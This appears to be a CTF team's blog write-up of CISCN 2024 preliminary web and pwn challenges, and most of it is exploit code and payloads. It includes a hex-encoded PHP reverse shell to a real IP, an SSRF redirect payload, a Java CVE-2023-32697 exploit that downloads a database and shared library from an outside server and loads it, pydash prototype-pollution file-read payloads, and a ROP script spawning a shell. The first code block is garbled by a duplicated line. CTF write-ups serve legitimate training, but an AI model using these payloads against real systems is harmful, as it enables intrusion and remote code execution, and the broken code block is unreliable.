<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CISCN2024初赛 | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>CISCN2024初赛</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-05-23T14:47:11.000Z" id="date"> 2024-05-23</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-05-23T07:40:11.583Z" id="updated"> 2024-05-23</time></div></span></div></div><hr><div id="post-content"><h1 id="Write-up-written-by-吃烧鸡会-pwned"><a href="#Write-up-written-by-吃烧鸡会-pwned" class="headerlink" title="Write up written by 吃烧鸡会 pwned"></a>Write up written by 吃烧鸡会 pwned</h1><script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML">
</script>


<h2 id="队伍信息"><a href="#队伍信息" class="headerlink" title="队伍信息"></a>队伍信息</h2><p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/YE2RbTOXZoz2BLx1aOmcpqZInJd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/YE2RbTOXZoz2BLx1aOmcpqZInJd.png"></p>
<p><strong>密码学有一坨公式不会在md写，待修复</strong></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>过滤了很多，一开始能读文件读目录但是没啥用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">php -r phpinfo()；发现可以执行php命令<br>php -r <span class="hljs-built_in">eval</span>(hex2bin(substrhp -r phpinfo()；发现可以执行php命令<br>php -r <span class="hljs-built_in">eval</span>(hex2bin(substr(_24736f636b3d66736f636b6f70656e28223132302e37382e3133352e3637222c36363636293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b,<span class="hljs-number">1</span>)));<br>反弹shell<br>发现有mysql服务<br>默认账号进去了<br>一路找下来<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/GSrZbL5o2oer1kxHvyMcaD0wncg.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/GSrZbL5o2oer1kxHvyMcaD0wncg.png"></p>
<h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>在官网上发现有个 qrcode 的 ssrf 同时发现题目上有 flag.php</p>
<p>我猜就是 ssrf 打 flag.php 然后命令执行</p>
<p>找代码中 qrcode 相关的函数</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/C3kUbgYGfojUUKxnP2QcS7iZnvg.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/C3kUbgYGfojUUKxnP2QcS7iZnvg.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SQnSbktnbojG9GxEstCcXB9snpY.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SQnSbktnbojG9GxEstCcXB9snpY.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RhTFbqweyo1czkxdwj8cyXl3nCb.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RhTFbqweyo1czkxdwj8cyXl3nCb.png"></p>
<p>其中 thumb 嵌入二维码中间的 logo 图片 URL，dr_catcher_data 函数获取 logo 图片的数据</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/QvIibzxTEoonzSxVEGwcwDUNnzN.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/QvIibzxTEoonzSxVEGwcwDUNnzN.png"></p>
<p>Payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/?s=api&amp;c=api&amp;m=qrcode&amp;text=<span class="hljs-number">1</span>&amp;thumb=http://vps&amp;size=<span class="hljs-number">10</span>&amp;level=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>一开始试了一下昨天的姿势，但是发现不通了，返回了一个类似图片认证的东西，我猜测服务器上做了一个类似强制认证图片，加个 GIF89a 试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">GIF89a<br>&lt;?php<br>echo <span class="hljs-string">&quot;GIF89a&quot;</span>;<br>header(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php?cmd=bash弹shell&#x27;</span>,true,<span class="hljs-number">302</span>);<br>exit();<br>?&gt;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/NdoZbwH5uoJdxPxAZxBc9NqLnTb.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/NdoZbwH5uoJdxPxAZxBc9NqLnTb.png"></p>
<h3 id="ezjava-复现"><a href="#ezjava-复现" class="headerlink" title="ezjava| 复现"></a>ezjava| 复现</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>一开始看到 jdbc 我就以为是 jdbc 打各种依赖，</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/IMbPbnleqo5kvOxm7nAc4GFSnVe.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/IMbPbnleqo5kvOxm7nAc4GFSnVe.png"></p>
<p>结果看了一圈都没有见到感觉能打的，后面知道了一个 sqlite 的 cve，CVE-2023-32697</p>
<p>参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ">https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ciscn2024</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class.forName(<span class="hljs-string">&quot;org.sqlite.JDBC&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://110.41.152.140/evil.db&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://110.41.152.140/shell3.so&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sqlite-jdbc-tmp-&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> tmp + <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1).hashCode() + <span class="hljs-string">&quot;.db&quot;</span>;<br>        System.out.println(db);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dll</span> <span class="hljs-operator">=</span> tmp + <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url2).hashCode() + <span class="hljs-string">&quot;.so&quot;</span>;<br>        System.out.println(dll);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(db).delete();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dll).delete();<br>        DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:sqlite::resource:&quot;</span>+url1).close();<br>        DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:sqlite::resource:&quot;</span>+url2).close();<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:sqlite:file:&quot;</span>+db+<span class="hljs-string">&quot;?enable_load_extension=true&quot;</span>);<br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select load_extension(&#x27;&quot;</span>+dll+<span class="hljs-string">&quot;&#x27;,&#x27;dllmain&#x27;)&quot;</span>;<br>        stmt.execute(sql);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>先在 vps 开个端口然后让题目访问下载到本地</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /jdbc/connect HTTP/1.1<br>Host: pwn.challenge.ctf.show:28169<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:sqlite::resource:http://110.41.152.140:81/evil.db&quot;</span>&#125;<br>------------------------------------------------------------------------------<br>&#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:sqlite::resource:http://110.41.152.140:81/evil.db&quot;</span>,<span class="hljs-string">&quot;tableName&quot;</span>:<span class="hljs-string">&quot;stu union select load_extension(&#x27;/tmp/sqlite-jdbc-tmp--1288104388.so&#x27;),1,1&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="R-sanic-复现"><a href="#R-sanic-复现" class="headerlink" title="R |sanic| 复现"></a>R |sanic| 复现</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">from</span> sanic_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-comment"># pydash==5.1.2</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br>Session(app)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> html(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">request</span>):<br>    user = request.cookies.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">if</span> user.lower() == <span class="hljs-string">&#x27;adm;n&#x27;</span>:<br>        request.ctx.session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login success&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login fail&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> request.ctx.session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-literal">True</span>:<br>        key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>        value = request.json[<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;_.&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>            pollute = Pollute()<br>            pydash.set_(pollute, key, value)<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>我们得先访问 login 才能访问 admin</p>
<p>如果想访问 login 的话我们得设置 cookie 为 adm;n，搜了一下貌似没有什么姿势，看看内部实现</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/VMoTb5yyUooTm5x2cQgc3B3Anvb.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/VMoTb5yyUooTm5x2cQgc3B3Anvb.png"></p>
<p>只能匹配 0-7，可以用个八进制来绕</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/IGVsbQ1PJoxzZbxNlAPcjf8Tngf.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/IGVsbQ1PJoxzZbxNlAPcjf8Tngf.png"></p>
<p>然后看 admin</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/KS4sbz1mxobo8sxLOw3cXjfAndf.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/KS4sbz1mxobo8sxLOw3cXjfAndf.png"></p>
<p>搜一下有个原型链污染，同时我们需要绕过对_.的判断</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/VnxBbhfUXoVF8ZxSL3IcvH9qnHe.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/VnxBbhfUXoVF8ZxSL3IcvH9qnHe.png"></p>
<p>可以用_\\.来绕</p>
<p>我们可以看到有个 src 路由，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br></code></pre></td></tr></table></figure>

<p>既然我们知道可以原型链污染，那么如果我们污染__file__那么就可以做到 rce</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;/etc/passwd&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<p>能够简单 rce 了</p>
<p>在 ctfshow 上可以直接读取环境变量得到 flag</p>
<p>但是题目代码中设置了一个 static 目录，我们需要看看这个 static 函数咋样的</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/R4EjbtzT7oUrBZx43yocJNE9noh.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/R4EjbtzT7oUrBZx43yocJNE9noh.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>: [<span class="hljs-string">&quot;/&quot;</span>]&#125;<br>&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>Gopwn x ROP</p>
<h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>把程序打崩可以打印堆栈信息，可以泄露地址（go 的字符串地址是不变的）</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/WUZhbbkZ6oaEKtxKmKlckQctni2.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/WUZhbbkZ6oaEKtxKmKlckQctni2.png"></p>
<p>远程打一次，这个是 syscall</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Rqz9bnfv2oKsFfxJWYTc01Bcn1f.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Rqz9bnfv2oKsFfxJWYTc01Bcn1f.png"></p>
<p>找 gadget</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/OdDDbGPFxoQpnLx7k2ncEmr5nLc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/OdDDbGPFxoQpnLx7k2ncEmr5nLc.png"></p>
<p>符号表不会修就不看逆向了</p>
<p>直接 rop 开打</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64<br><span class="hljs-comment">#p = process(&#x27;./gostack&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;8.147.133.230&quot;</span>,<span class="hljs-number">33569</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./gostack&#x27;</span>)<br><br>syscall = <span class="hljs-number">0x404043</span><br>pop_rax_ret = <span class="hljs-number">0x40f984</span><br>pop_rdi_14_13_12_rbp_rbx_ret = <span class="hljs-number">0x4a18a5</span><br>pop_rsi_ret = <span class="hljs-number">0x42138a</span><br>pop_rdx_ret = <span class="hljs-number">0x4944ec</span><br>bss = <span class="hljs-number">0x05633A0</span><br><span class="hljs-comment">#binsh = 0x000000c000073f70</span><br>binsh = <span class="hljs-number">0x000000c000043fd8</span> + <span class="hljs-number">8</span><br>vuln_main = <span class="hljs-number">0x4A0880</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">58</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">59</span>)+ p64(pop_rdi_14_13_12_rbp_rbx_ret) + p64(binsh) <br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(pop_rdx_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) +p64(syscall)+ p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/WlFNb2E3noTx41xTzIMc9FKknsg.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/WlFNb2E3noTx41xTzIMc9FKknsg.png"></p>
<h3 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>House of orange + malloc hook</p>
<h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>add 允许 0x1000 的堆块</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Kc6rbGSgho7SHDxV0iFcv8rJnzc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Kc6rbGSgho7SHDxV0iFcv8rJnzc.png"></p>
<p>free 和 show 都只有一次</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SE3rb9H5eo067nxxF24ckTg5nTc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SE3rb9H5eo067nxxF24ckTg5nTc.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Qxc3bKr88osOOgx6APZcP87Bnid.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Qxc3bKr88osOOgx6APZcP87Bnid.png"></p>
<p>edit 存在越界修改和 edit after free</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Mi4Ab2vN7o2XVSxpJIKcGWbEnPe.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Mi4Ab2vN7o2XVSxpJIKcGWbEnPe.png"></p>
<p>所以使用 edit 能修改 topchunk，再申请一个大堆块就能使原 topchunk 进入 unsortedbin，以此泄露 libc 地址</p>
<p>fastbin attack 修改 malloc hook 为 onegadget，最后再次申请堆块时触发 onegadget 拿到 shell</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/UuOqbINDuoDsstxVwr0cWC6KnIb.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/UuOqbINDuoDsstxVwr0cWC6KnIb.png"></p>
